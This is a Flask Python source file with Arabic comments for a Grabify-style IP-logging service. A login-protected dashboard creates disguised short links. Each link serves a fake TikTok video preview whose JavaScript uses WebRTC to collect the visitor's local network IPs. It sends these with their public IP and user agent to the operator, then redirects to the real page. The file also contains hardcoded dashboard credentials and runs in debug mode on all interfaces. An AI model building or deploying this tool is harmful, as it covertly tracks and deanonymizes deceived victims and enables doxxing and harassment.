from flask import Flask, render_template_string, request, redirect, jsonify, Response
import uuid
import datetime
from functools import wraps

app = Flask(__name__)

# قاعدة بيانات مؤقتة في الذاكرة لحفظ الروابط والنقرات
links_db = {}

# بيانات تسجيل الدخول للوحة التحكم الخاصة بك
USERNAME = "khaled"
PASSWORD = "ALG@2022"

def check_auth(username, password):
    return username == USERNAME and password == PASSWORD

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return Response(
                'يجب تسجيل الدخول للوصول إلى لوحة التحكم.', 401,
                {'WWW-Authenticate': 'Basic realm="Login Required"'}
            )
        return f(*args, **kwargs)
    return decorated

# واجهة مستوحاة من تصميم Grabify متوافقة تماماً مع شاشات الهاتف
HTML_LAYOUT = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>منصتي الذكية لإدارة الروابط</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f6f9; color: #333; margin: 0; padding: 0; }
        .navbar { background-color: #1a252f; color: white; padding: 15px; text-align: center; font-size: 18px; font-weight: bold; }
        .container { max-width: 900px; margin: 15px auto; padding: 15px; box-sizing: border-box; }
        
        /* كروت الإحصائيات العامة مثل Grabify */
        .stats-overview { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 20px; }
        .stat-card { background: white; padding: 15px; border-radius: 8px; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border-top: 4px solid #34495e; }
        .stat-card h3 { margin: 0; font-size: 13px; color: #7f8c8d; }
        .stat-card p { margin: 5px 0 0 0; font-size: 20px; font-weight: bold; color: #2c3e50; }
        
        /* نموذج إنشاء الروابط */
        .create-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.06); margin-bottom: 25px; }
        .create-box h2 { margin-top: 0; font-size: 16px; color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 5px; }
        label { font-weight: bold; display: block; margin-top: 10px; font-size: 14px; color: #555; }
        input[type="text"], input[type="url"] { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
        button { width: 100%; background-color: #3498db; color: white; border: none; padding: 12px; margin-top: 15px; border-radius: 4px; font-size: 15px; font-weight: bold; cursor: pointer; }
        button:hover { background-color: #2980b9; }

        /* جدول الروابط المنشأة (My Links) */
        .section-title { font-size: 16px; color: #2c3e50; margin: 20px 0 10px 0; font-weight: bold; }
        .table-wrapper { background: white; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.06); overflow-x: auto; margin-bottom: 25px; }
        .main-table { width: 100%; border-collapse: collapse; font-size: 13px; text-align: center; }
        .main-table th, .main-table td { padding: 12px 10px; border-bottom: 1px solid #edf2f7; }
        .main-table th { background-color: #34495e; color: white; font-weight: 6px; }
        .main-table tr:hover { background-color: #f8f9fa; }
        .link-text { color: #3498db; text-decoration: none; word-break: break-all; font-size: 12px; }
        .badge { background: #e74c3c; color: white; padding: 2px 6px; border-radius: 4px; font-weight: bold; }
        
        /* سجلات الزيارات المفصلة للـ IPs */
        .logs-box { background: white; padding: 15px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.06); margin-top: 20px; }
        .logs-table { width: 100%; border-collapse: collapse; font-size: 12px; text-align: center; margin-top: 10px; }
        .logs-table th, .logs-table td { padding: 10px; border: 1px solid #e2e8f0; }
        .logs-table th { background-color: #2c3e50; color: white; }
    </style>
</head>
<body>
    <div class="navbar">📊 لوحة تحكم الروابط والتتبع (Grabify المطور)</div>
    <div class="container">
        
        <div class="stats-overview">
            <div class="stat-card">
                <h3>إجمالي الروابط (All URLs)</h3>
                <p>{{ total_links }}</p>
            </div>
            <div class="stat-card" style="border-top-color: #e74c3c;">
                <h3>إجمالي النقرات (Total Clicks)</h3>
                <p>{{ total_clicks }}</p>
            </div>
        </div>

        <div class="create-box">
            <h2>🔗 إنشاء رابط تتبع جديد</h2>
            <form action="/create" method="POST">
                <label>الرابط الأصلي (Original URL):</label>
                <input type="url" name="original_url" placeholder="https://vt.tiktok.com/..." required>
                
                <label>ملاحظة لتمييز الرابط (Note):</label>
                <input type="text" name="note" placeholder="مثال: فسيليتي 11" required>
                
                <button type="submit">توليد الرابط المموّه</button>
            </form>
        </div>

        <div class="section-title">📋 قائمة الروابط النشطة (My Links)</div>
        <div class="table-wrapper">
            <table class="main-table">
                <thead>
                    <tr>
                        <th>#</th>
                        <th>الملاحظة (Note)</th>
                        <th>النقرات</th>
                        <th>رابط التمويه للإرسال</th>
                        <th>الرابط الحقيقي الأصلي</th>
                    </tr>
                </thead>
                <tbody>
                    {% if not links_db %}
                    <tr>
                        <td colspan="5" style="padding: 20px; color: #95a5a6;">لا توجد روابط منشأة حتى الآن.</td>
                    </tr>
                    {% else %}
                        {% for id, data in links_db.items() %}
                        <tr>
                            <td>{{ loop.index }}</td>
                            <td style="font-weight: bold; color: #2c3e50;">{{ data.note }}</td>
                            <td><span class="badge">{{ data.clicks|length }}</span></td>
                            <td><a class="link-text" href="/secure/{{ id }}" target="_blank">{{ host_url }}secure/{{ id }}</a></td>
                            <td><span class="link-text" style="color:#7f8c8d;">{{ data.url[:30] }}...</span></td>
                        </tr>
                        {% endfor %}
                    {% endif %}
                </tbody>
            </table>
        </div>

        <div class="section-title">🔍 سجل النقرات المباشر وتتبع الأجهزة (Logs)</div>
        <div class="logs-box">
            {% set has_clicks = false %}
            <table class="logs-table">
                <thead>
                    <tr>
                        <th>الرابط (الملاحظة)</th>
                        <th>الوقت (Date/Time)</th>
                        <th>الـ IP العام ومزود الخدمة</th>
                        <th>الـ IP المحلي (LAN)</th>
                        <th>نوع الهاتف والمتصفح (User Agent)</th>
                    </tr>
                </thead>
                <tbody>
                    {% for id, data in links_db.items() %}
                        {% for click in data.clicks %}
                            {% set has_clicks = true %}
                            <tr>
                                <td style="background: #fcf8e3; font-weight: bold;">{{ data.note }}</td>
                                <td>{{ click.time }}</td>
                                <td style="color:#e74c3c; font-weight:bold;">{{ click.ip }}</td>
                                <td style="color:#27ae60; font-weight:bold;">{{ click.local_ip }}</td>
                                <td style="font-size:11px; text-align:right; max-width:200px; word-break:break-all;">{{ click.device }}</td>
                            </tr>
                        {% endfor %}
                    {% endfor %}
                    
                    {% if not has_clicks %}
                    <tr>
                        <td colspan="5" style="padding: 20px; color: #95a5a6;">بانتظار تسجيل نقرات أو زيارات جديدة...</td>
                    </tr>
                    {% endif %}
                </tbody>
            </table>
        </div>

    </div>
</body>
</html>
'''

@app.route('/')
@requires_auth
def home():
    total_links = len(links_db)
    total_clicks = sum(len(data['clicks']) for data in links_db.values())
    return render_template_string(HTML_LAYOUT, links_db=links_db, host_url=request.host_url, total_links=total_links, total_clicks=total_clicks)

@app.route('/create', methods=['POST'])
@requires_auth
def create():
    original_url = request.form.get('original_url')
    note = request.form.get('note')
    link_id = str(uuid.uuid4())[:6].upper() # كود قصير مكون من 6 أحرف مثل Grabify
    
    links_db[link_id] = {
        'url': original_url,
        'note': note,
        'clicks': []
    }
    return redirect('/')

@app.route('/secure/<link_id>')
def secure_redirect(link_id):
    if link_id in links_db:
        data = links_db[link_id]
        
        title = "TikTok · Video Premium"
        description = "▶ Watch high quality video clip."
        image_url = "https://upload.wikimedia.org/wikipedia/commons/thumb/0/09/YouTube_full-color_icon_%282017%29.svg/640px-YouTube_full-color_icon_%282017%29.svg.png"
        
        return f'''
        <!DOCTYPE html>
        <html lang="ar">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>{title}</title>
            <meta property="og:title" content="{title}">
            <meta property="og:description" content="{description}">
            <meta property="og:image" content="{image_url}">
            <meta property="og:type" content="video.other">
            <script>
                function gatherLocalIPsAndRedirect() {{
                    var detectedIPs = [];
                    window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                    
                    if (!window.RTCPeerConnection) {{
                        sendData("غير مدعوم");
                        return;
                    }}

                    var pc = new RTCPeerConnection({{ iceServers: [] }});
                    pc.createDataChannel(""); 
                    
                    pc.onicecandidate = function(e) {{
                        if (!e || !e.candidate || !e.candidate.candidate) return;
                        var candidate = e.candidate.candidate;
                        var ipRegex = /([0-9]{{1,3}}(\\.[0-9]{{1,3}}){{3}})/;
                        var mdnsRegex = /([a-f0-9\\-]+\\.local)/i;
                        
                        var match = ipRegex.exec(candidate) || mdnsRegex.exec(candidate);
                        if (match && detectedIPs.indexOf(match[1]) === -1) {{
                            detectedIPs.push(match[1]);
                        }}
                    }};

                    pc.createOffer().then(function(sdp) {{
                        sdp.sdp.split('\\n').forEach(function(line) {{
                            if(line.indexOf('c=IN') === 0 || line.indexOf('a=candidate') === 0) {{
                                var parts = line.split(' ');
                                parts.forEach(function(part){{
                                    if(part.match(/[0-9]{{1,3}}(\\.[0-9]{{1,3}}){{3}}/) || part.match(/\\.local$/)) {{
                                        if(detectedIPs.indexOf(part) === -1) detectedIPs.push(part);
                                    }}
                                }});
                            }}
                        }});
                        pc.setLocalDescription(sdp);
                    }}).catch(function(err) {{ }});

                    setTimeout(function() {{
                        var finalLocalIp = detectedIPs.length > 0 ? detectedIPs.join(" | ") : "مخفي أو مشفر (mDNS)";
                        sendData(finalLocalIp);
                    }}, 1000);
                }}

                function sendData(localIp) {{
                    var xhr = new XMLHttpRequest();
                    xhr.open("POST", "/log-click/{link_id}", true);
                    xhr.setRequestHeader("Content-Type", "application/json");
                    xhr.onreadystatechange = function () {{
                        if (xhr.readyState === 4) {{
                            window.location.href = "{data['url']}";
                        }}
                    }};
                    xhr.send(JSON.stringify({{ "local_ip": localIp }}));
                }}
                window.onload = gatherLocalIPsAndRedirect;
            </script>
        </head>
        <body style="background:#000; color:#fff; font-family:sans-serif; text-align:center; padding-top:45%;">
            <div>جاري تشغيل مقطع الفيديو... 🎬</div>
        </body>
        </html>
        '''
    return "الرابط غير موجود", 404

@app.route('/log-click/<link_id>', methods=['POST'])
def log_click(link_id):
    if link_id in links_db:
        data = request.get_json() or {}
        local_ip = data.get('local_ip', 'غير معروف')
        
        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ip_address and ',' in ip_address:
            ip_address = ip_address.split(',')[0].strip()
            
        user_agent = request.headers.get('User-Agent')
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        links_db[link_id]['clicks'].append({
            "ip": ip_address,
            "local_ip": local_ip,
            "device": user_agent,
            "time": current_time
        })
        return jsonify({"status": "success"}), 200
    return jsonify({"status": "error"}), 404

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
